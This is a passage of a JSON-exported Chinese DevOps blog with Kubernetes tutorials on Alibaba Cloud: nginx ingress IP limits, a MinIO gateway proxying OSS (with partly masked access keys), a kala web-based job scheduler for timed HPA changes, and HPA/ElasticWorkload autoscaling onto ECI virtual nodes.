class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e     \u003c/span\u003e- \u003cspan class=\"nt\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e/ \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"nt\"\u003ebackend\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e         \u003c/span\u003e\u003cspan class=\"nt\"\u003eserviceName\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003enginx-svc \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意，多个ip的话，之间用逗号隔开（该值是逗号分隔的CIDR列表） ：\u003c/p\u003e","title":"kubernetes下nginx ingress的限制"},{"content":"阿里的云的 OSS 并不是完全版本的 AWS S3 兼容。\n我们如果需要用 S3 协议访问 OSS，就比较麻烦了。\n所以搭建一个 minio 来做网关，代理OSS，minio 是基本兼容S3的，所以这样曲线救国，通过 S3 协议访问 minio 来访问最后端的 OSS\n这里还有一段故事：\nMinio 中间有一版是支持 oss 的，但是后来 oss 改了协议，所以现在的最新版本 minio 反而是不支持代理 oss 的，我们必须手动作出镜像，放到镜像库里，然后阿里 ACK 再使用\n首先去下载那一版直接支持oss的\nwget http://dl.minio.org.cn/server/minio/release/linux-amd64/archive/minio.RELEASE.2020-04-15T19-42-18Z chmod 755 minio.RELEASE.2020-04-15T19-42-18Z 这个文件比较宝贵，给个本地备份链接下载：\nminio.RELEASE.2020-04-15T19-42-18Z\n然后在当前目录编辑 Dockerfile ，因为 K8S 和 OSS 同一地域，所以用 OSS 私网域名：\nFROM alpine:3.12 RUN apk add --update bash \u0026amp;\u0026amp; rm -rf /var/cache/apk/* COPY minio.RELEASE.2020-04-15T19-42-18Z /data/minio.RELEASE.2020-04-15T19-42-18Z ENV MINIO_ACCESS_KEY=LTAI5tFFTbsxxxxxuLb ENV MINIO_SECRET_KEY=t78PyGnHZilxxxxxdxBCjvNgtVC5Y WORKDIR /data EXPOSE 9000 CMD [\u0026#34;/data/minio.RELEASE.2020-04-15T19-42-18Z\u0026#34;,\u0026#34;gateway\u0026#34;,\u0026#34;oss\u0026#34;,\u0026#34;http://oss-cn-shanghai-internal.aliyuncs.com\u0026#34;] # CMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34; 注意上面，MINIO_ACCESS_KEY 和 MINIO_SECRET_KEY 对应的是阿里云 OSS的 AccessKey ID 和 AccessKey Secret\n打开阿里云网址，新建AccessKey ID 和 AccessKey Secret ，注意这东西只能看见一次，之后再也不能明文看了，所以第一次务必保存好！！！\nhttps://ram.console.aliyun.com/manage/ak\n然后还有 Dockerfile 的最后一行，八戒的习惯是保留一个死循环 shell，如果镜像 CMD 有问题，无法启动，就换成这个先启动，然后再进去调试。（经常有什么库错、链接搞不好需要修改）\ndocker build -t registry.cn-shanghai.aliyuncs.com/rendoumi/minio . 然后 push 上去\ndocker push registry.cn-shanghai.aliyuncs.com/rendoumi/minio 编写好Deployment和svc，如果想公开还可以写 ingress 向外暴露，自己公司用还是 port-forward 更安全\n--- apiVersion: apps/v1 kind: Deployment metadata: name: minio-deploy labels: app: minio spec: replicas: 1 selector: matchLabels: app: minio template: metadata: labels: app: minio spec: containers: - name: minio image: registry.cn-shanghai.aliyuncs.com/rendoumi/minio:latest ports: - containerPort: 9000 --- apiVersion: v1 kind: Service metadata: name: minio-svc labels: app: minio spec: ports: - name: http protocol: TCP port: 9000 targetPort: 9000 selector: app: minio type: ClusterIP 然后开转发：\nkubectl port-forward svc/minio-svc 9000:9000 \u0026amp; 用浏览器访问 http://localhost:9000 就可以了，还得输入一遍密码\n这样就可以看到 OSS 的所有桶了\nMinio的官方命令行客户端是 mc，使用方法如下：\nwget https://dl.min.io/client/mc/release/linux-amd64/mc chmod 755 mc ./mc alias set minio http://minio-svc:9000 MINIO_ACCESS_KEY 和 MINIO_SECRET_KEY ./mc ls minio minio 跑在容器外进行 OSS 代理的方法，注意不同地方，OSS 的域名改为公网的了：\n#!/bin/sh export MINIO_ACCESS_KEY=LTAI5tFFTbsxxxxxuLb export MINIO_SECRET_KEY=t78PyGnHZilxxxxxdxBCjvNgtVC5Y nohup ./minio.RELEASE.2020-04-15T19-42-18Z gateway oss http://oss-cn-shanghai.aliyuncs.com \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp; ","permalink":"https://rendoumi.com/posts/20211126-kubernetes_minio_oss_gateway/","summary":"\u003cp\u003e阿里的云的 OSS 并不是完全版本的 AWS S3 兼容。\u003c/p\u003e\n\u003cp\u003e我们如果需要用 S3 协议访问 OSS，就比较麻烦了。\u003c/p\u003e\n\u003cp\u003e所以搭建一个 minio 来做网关，代理OSS，minio 是基本兼容S3的，所以这样曲线救国，通过 S3 协议访问 minio 来访问最后端的 OSS\u003c/p\u003e\n\u003cp\u003e这里还有一段故事：\u003c/p\u003e\n\u003cp\u003eMinio 中间有一版是支持 oss 的，但是后来 oss 改了协议，所以现在的最新版本 minio 反而是不支持代理 oss 的，我们必须手动作出镜像，放到镜像库里，然后阿里 ACK 再使用\u003c/p\u003e\n\u003cp\u003e首先去下载那一版直接支持oss的\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://dl.minio.org.cn/server/minio/release/linux-amd64/archive/minio.RELEASE.2020-04-15T19-42-18Z \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e755\u003c/span\u003e minio.RELEASE.2020-04-15T19-42-18Z \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这个文件比较宝贵，给个本地备份链接下载：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"minio.RELEASE.2020-04-15T19-42-18Z\"\u003eminio.RELEASE.2020-04-15T19-42-18Z\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e然后在当前目录编辑 Dockerfile ，因为 K8S 和 OSS 同一地域，所以用 OSS 私网域名：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eFROM alpine:3.12 \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eRUN apk add --update bash \u0026amp;\u0026amp; rm -rf /var/cache/apk/*  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eCOPY minio.RELEASE.2020-04-15T19-42-18Z /data/minio.RELEASE.2020-04-15T19-42-18Z  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eENV MINIO_ACCESS_KEY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eLTAI5tFFTbsxxxxxuLb  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eENV MINIO_SECRET_KEY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003et78PyGnHZilxxxxxdxBCjvNgtVC5Y  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eWORKDIR /data  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eEXPOSE 9000  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eCMD [\u0026#34;/data/minio.RELEASE.2020-04-15T19-42-18Z\u0026#34;,\u0026#34;gateway\u0026#34;,\u0026#34;oss\u0026#34;,\u0026#34;http://oss-cn-shanghai-internal.aliyuncs.com\u0026#34;] \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# CMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意上面，MINIO_ACCESS_KEY 和 MINIO_SECRET_KEY 对应的是阿里云 OSS的 AccessKey ID 和 AccessKey Secret\u003c/p\u003e","title":"kubernetes搭建minio作为阿里OSS的Gateway"},{"content":"本来 k8s 的 crontab 是启动一个容器来运行的，很简单，如下：\napiVersion: batch/v1beta1 kind: CronJob metadata: name: curl-cron spec: schedule: \u0026#34;*/1 * * * *\u0026#34; jobTemplate: spec: template: spec: containers: - name: curl-cron image: radial/busyboxplus:curl imagePullPolicy: IfNotPresent command: - /bin/sh - -c - date;echo \u0026#34;run crontab\u0026#34;;curl http://www.baidu.com restartPolicy: OnFailure successfulJobsHistoryLimit: 2 failedJobsHistoryLimit: 2 上面就跑了一个 busybox 的 pod，每分钟去访问百度，然后在 stdout 输出结果\n这个没什么，注意上面文件的最后两行。限制成功以及失败 job 的 History 数量，如果不加限制，kubectl get pods 会看到无穷无尽的completed 状态的 curl-cron pod。\n分割线，部署 crontab 的 yaml 很简单。但是，现在产品部有个需求，他们要在某一天进行促销活动，大概2天，期间会流量大增，于是想应用 hpa 来伸缩 pod，活动结束后关闭 hpa。之后他们还会有不断的促销，研发不知道什么时候开始，什么时候结束；但是研发又不想产品部看到 yaml，并且随时配合部署 hpa。\n还有个问题，如果用crontab，那么活动开始运行一次，活动结束一次，最后研发还得清理删除掉这两个 crontab 来恢复正常。\n这下麻烦了，有什么页面管理 crontab 的神器，能让产品部自己运行，然后权限分离，而且能指定再未来的某天运行一次或多次，且不用手工清理就好了。\n还真的有一个，kala 就是了！！！\nKala 是一个cron管理配置工具，项目地址：\nhttps://github.com/ajvb/kala\n卡拉是基于 Airbnb 的 Chronos 翻写的 Go 程序。\n它比 crontab 更好一些的是，可以指定未来某天的一次性执行任务，有个使用界面\nKala 可以执行本地的命令，也可以发起 http 的请求。\n注意，kala 的源代码里有一个地方需要修改，否则参数bolt-path不生效，我们改掉它自己编译个2进制程序出来。\nModify cmd/server.go switch viper.GetString(\u0026#34;jobdb\u0026#34;) { case \u0026#34;boltdb\u0026#34;: db = boltdb.GetBoltDB(viper.GetString(\u0026#34;boltpath\u0026#34;)) Change to db = boltdb.GetBoltDB(viper.GetString(\u0026#34;bolt-path\u0026#34;)) Run it : ./kala serve --jobdb=boltdb --bolt-path=/data/db 我们用 Dockerfile 造一个镜像出来：\nFROM alpine:3.12 RUN apk add --update bash \u0026amp;\u0026amp; rm -rf /var/cache/apk/* COPY . /data/ RUN mkdir /lib64 \u0026amp;\u0026amp; \\ ln -s /lib/libc.musl-x86_64.so.1 /lib64/ld-linux-x86-64.so.2 \u0026amp;\u0026amp; \\ mv /data/kubectl /bin \u0026amp;\u0026amp; \\ mv /data/.kube /root \u0026amp;\u0026amp; \\ rm -rf /data/Dockerfile WORKDIR /data EXPOSE 8000 CMD [\u0026#34;/data/kala\u0026#34;, \u0026#34;serve\u0026#34;,\u0026#34;--jobdb=boltdb\u0026#34;,\u0026#34;--bolt-path=/data/db\u0026#34;] #CMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34; 注意上面我们把 kubectl 和 .kube 配置一起放进了镜像，当然一些 yaml 和脚本也可以都打进去，然后推到阿里云镜像仓库去（注意安全问题）。\n备注 ：kala默认的端口是8000，访问 url 是 /webui\n然后我们生成一个 secret 放进 k8s\nhtpasswd -c auth kala-auth New password: Re-type new password: Adding password for user kala kubectl create secret generic kala-auth --from-file=kala-auth secret \u0026#34;kala-auth\u0026#34; created kubectl get secret kala-auth -o yaml 然后我们定义一系列的资源文件，Deployment、SVC、Ingress，其中 ingress 引用了 kala-auth 的 secret，并且指定了 app-root 是 /webui/。\n另外 kala 使用了 k8s-kala-5g 的持久化卷，务必事先准备好 pv 和 pvc，不持久化的话 pod 一重启，之前保存的配置信息就全没了。\n--- apiVersion: apps/v1 kind: Deployment metadata: name: kala-deploy labels: app: kala spec: replicas: 1 selector: matchLabels: app: kala template: metadata: labels: app: kala spec: containers: - name: kala image: registry.cn-shanghai.aliyun.com/xxx/kala:latest imagePullPolicy: Always ports: - containerPort: 8000 volumeMounts: - mountPath: /data/db name: kala-data volumes: - name: kala-data persistentVolumeClaim: claimName: k8s-kala-5g --- apiVersion: v1 kind: Service metadata: name: kala-svc labels: app: kala spec: ports: - name: http protocol: TCP port: 8000 targetPort: 8000 selector: app: kala type: ClusterIP --- apiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: name: kala-com-ingress annotations: kubernetes.io/ingress.class: nginx nginx.ingress.kubernetes.io/block-cidrs: 111.201.134.93/32 nginx.ingress.kubernetes.io/auth-type: basic nginx.ingress.kubernetes.io/auth-secret: kala-auth nginx.ingress.kubernetes.io/auth-realm: \u0026#39;Authentication Required - Kala\u0026#39; nginx.ingress.kubernetes.io/app-root: \u0026#39;/webui/\u0026#39; spec: rules: - host: kala.rendoumi.com http: paths: - path: / backend: serviceName: kala-svc servicePort: 80 这样 kala 就可以从公网访问了，http://kala.rendoumi.com:8000/ ，且需要提供密码才能进入。\n下面说一下具体的用法，还是有一些技巧性的，登录进去后的页面：\n进入后左上角点击 Create 建立新任务\n要填写内容如下：\nJob name：起个名字，叫：增大HPA\nCommand：要运行的脚本：/data/resize.sh 35 (固定扩大ECI的脚本)\nSchedule：R0/2021-07-07T06:00:00+08:00/PT0S\n​ 这个最重要\n​ 这行的格式是这样的：Number of times to repeat/Start Datetime/Interval Between Runs\n​ R0 重复0次，即只执行一次，不重复\n​ 2021-07-06T06:00:00+8:00 时间戳，注意时区中国+8:00\n​ PT0S 无延迟0S启动\n​ 合起来就是\n​ R0/2021-07-07T06:00:00+08:00/PT0S 就是在2021年7月7日中国时间6点无任何延迟执行一次脚本 resize.sh\nReset Form 这个一定要选掉，保持空，否则下次进来上次的数据都没了，还得手动输入，麻烦 其他都不填写，然后 Create 就行了\n然后我们可以再建一个恢复的任务\n我们去界面就可以看到多了两个任务，增大HPA和恢复HPA，这样就 OK 了\n注意：JOB一旦建立，以后就可以直接从界面上手动执行，Run Manually\n这东西真是个神器，产品部的同事可以随时修改hpa和恢复，而不用通过研发部了，善莫大焉。\n","permalink":"https://rendoumi.com/posts/20211125-kubernetes_crontab_kala/","summary":"\u003cp\u003e本来 k8s 的 crontab 是启动一个容器来运行的，很简单，如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003eapiVersion\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ebatch/v1beta1\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003ekind\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eCronJob\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003emetadata\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ecurl-cron\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003espec\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eschedule\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;*/1 * * * *\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ejobTemplate\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003espec\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003etemplate\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003espec\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003econtainers\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ecurl-cron\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003eimage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eradial/busyboxplus:curl\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003eimagePullPolicy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eIfNotPresent\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003ecommand\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e- \u003cspan class=\"l\"\u003e/bin/sh\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e- -\u003cspan class=\"l\"\u003ec\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e- \u003cspan class=\"l\"\u003edate;echo \u0026#34;run crontab\u0026#34;;curl http://www.baidu.com\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003erestartPolicy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eOnFailure\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003esuccessfulJobsHistoryLimit\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003efailedJobsHistoryLimit\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e上面就跑了一个 busybox 的 pod，每分钟去访问百度，然后在 stdout 输出结果\u003c/p\u003e\n\u003cp\u003e这个没什么，注意上面文件的最后两行。限制成功以及失败 job 的 History 数量，如果不加限制，kubectl get pods 会看到无穷无尽的completed 状态的 curl-cron pod。\u003c/p\u003e","title":"替代kubernetes crontab的神器kala"},{"content":"kubernetes 的动态伸缩 HPA 是非常有用的特性。\n我们的服务器托管在阿里云的 ACK 上，k8s 根据 cpu 或者 内存的使用情况，会自动伸缩关键 pod 的数量，以应对大流量的情形。而且更妙的是，动态扩展的 pod 并不是使用自己的固定服务器，而是使用阿里动态的 ECI 虚拟节点服务器，这样就真的是即开即用，用完即毁。有多大流量付多少钱，物尽其用。\n我们先明确一下概念：\nk8s 的资源指标获取是通过 api 接口来获得的，有两种 api，一种是核心指标，一种是自定义指标。\n核心指标：Core metrics，由metrics-server提供API，即 metrics.k8s.io，仅提供Node和Pod的CPU和内存使用情况。api 是 metrics.k8s.io\n自定义指标：Custom Metrics，由Prometheus Adapter提供API，即 custom.metrics.k8s.io，由此可支持任意Prometheus采集到的自定义指标。api 是 custom.metrics.k8s.io 和 external.metrics.k8s.io\n一、核心指标metrics-server 阿里的 ACK 缺省是装了 metrics-server 的，看一下，系统里有一个metrics-server\nkubectl get pods -n kube-system 再看看 api 的核心指标能拿到什么，先看 Node 的指标：\nkubectl get --raw \u0026#34;/apis/metrics.k8s.io\u0026#34; | jq . kubectl get --raw \u0026#34;/apis/metrics.k8s.io/v1beta1\u0026#34; | jq . kubectl get --raw \u0026#34;/apis/metrics.k8s.io/v1beta1/nodes\u0026#34; | jq . 可以看到阿里 eci 虚拟节点的 cpu 和 memory 资源。\n再看看 Pod 的指标：\nkubectl get --raw \u0026#34;/apis/metrics.k8s.io/v1beta1/pods\u0026#34; | jq . 可以清楚得看到调度到虚拟节点上的 Pod 的 cpu 和 memory 资源使用情况。大家看到只有 cpu 和 memory，这就够了。\n给个全部使用自己 Work Node 实体节点伸缩的例子：\nphp-hpa.yaml (这里定义了平均cpu使用到达80%或者内存平均使用到200M就伸缩）：\nphp-hpa 规范了 php-deploy 如何伸缩，最小2，最大10：\napiVersion: autoscaling/v2beta1 kind: HorizontalPodAutoscaler metadata: name: php-hpa namespace: default spec: scaleTargetRef: apiVersion: extensions/v1beta1 kind: Deployment name: php-deploy minReplicas: 2 maxReplicas: 10 metrics: - type: Resource resource: name: cpu targetAverageUtilization: 80 - type: Resource resource: name: memory targetAverageValue: 200Mi 再给个阿里 ACK 使用 ECI 虚拟节点伸缩的例子：\n我们首先定义一个正常的 deployment ，php-deploy，这个就正常定义跟别的没区别。\n然后再定义扩展到 eci 节点的 ElasticWorload，elastic-php，这个用来控制 php-deploy 拓展到 eci 虚拟节点去\n下面是固定6个，动态24个，合计30个\napiVersion: autoscaling.alibabacloud.com/v1beta1 kind: ElasticWorkload metadata: name: elastic-php spec: sourceTarget: name: php-deploy kind: Deployment apiVersion: apps/v1 min: 0 max: 6 elasticUnit: - name: virtual-kubelet labels: virtual-kubelet: \u0026#34;true\u0026#34; alibabacloud.com/eci: \u0026#34;true\u0026#34; annotations: virtual-kubelet: \u0026#34;true\u0026#34; nodeSelector: type: \u0026#34;virtual-kubelet\u0026#34; tolerations: - key: \u0026#34;virtual-kubelet.io/provider\u0026#34; operator: \u0026#34;Exists\u0026#34; min: 0 max: 24 replicas: 30 然后定义 HPA php-hpa 来控制 elastic-php 的自动伸缩\napiVersion: autoscaling/v2beta2 kind: HorizontalPodAutoscaler metadata: name: php-hpa namespace: default spec: scaleTargetRef: apiVersion: autoscaling.alibabacloud.com/v1beta1 kind: ElasticWorkload name: elastic-php minReplicas: 6 maxReplicas: 30 metrics: - type: Resource resource: name: cpu target: type: Utilization averageUtilization: 90 behavior: scaleUp: policies: #- type: percent # value: 500% - type: Pods value: 5 periodSeconds: 180 scaleDown: policies: - type: Pods value: 1 periodSeconds: 600 上面的 ElasticWorkload 需要仔细解释一下，php-deploy 定义的 pod 副本固定是6个，这6个都是在我们自己节点上不用再付费，然后 ECI 的 pod 副本数是0个到24个，那么总体pod数量就是 6+24 = 30 个，其中 24个是可以在虚拟节点上伸缩的。而 php-hpa 定义了伸缩范围是 6-30，那就意味着平时流量小的时候用的都是自己服务器上那6个固定 pod，如果流量大了，就会扩大到 eci 虚拟节点上，虚拟节点最大量是24个，如果流量降下来了，就会缩回去，缩到自己服务器的6个pod 上去。这样可以精确控制成本。\nphp-hpa 